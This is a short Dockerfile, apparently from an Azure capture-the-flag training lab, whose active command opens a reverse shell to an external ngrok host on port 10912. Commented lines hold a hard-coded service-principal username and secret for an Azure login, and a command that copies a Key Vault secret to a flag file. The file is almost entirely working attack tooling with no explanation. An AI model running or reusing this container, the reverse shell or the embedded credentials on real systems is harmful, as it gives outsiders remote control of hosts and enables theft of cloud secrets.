FROM alpine:latest
RUN apk add --no-cache curl
#RUN apt-get update && apt-get install -y curl
#RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"
CMD ["bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"]

#FROM mcr.microsoft.com/azure-cli

# Optional: install bash if not present
#RUN apk add --no-cache bash

# Set default command to keep container alive or run your script
#RUN bash -c "az login -u  3fe3690e-a7e5-4c78-9970-94cf5bb7dcd7 -p prA8Q~emnSdctR74hWVBc6ojLP0-wAlaId5pidA3 --tenant azure.training.hacktricks.xyz --service-principal"
#CMD ["bash", "-c", "az login -u  3fe3690e-a7e5-4c78-9970-94cf5bb7dcd7 -p prA8Q~emnSdctR74hWVBc6ojLP0-wAlaId5pidA3 --tenant azure.training.hacktricks.xyz --service-principal"]

#FROM mcr.microsoft.com/azure-cli
#RUN bash -c "az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv > /tmp/flag.txt"
#CMD ["bash", "-c", "az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv > /tmp/flag.txt"]

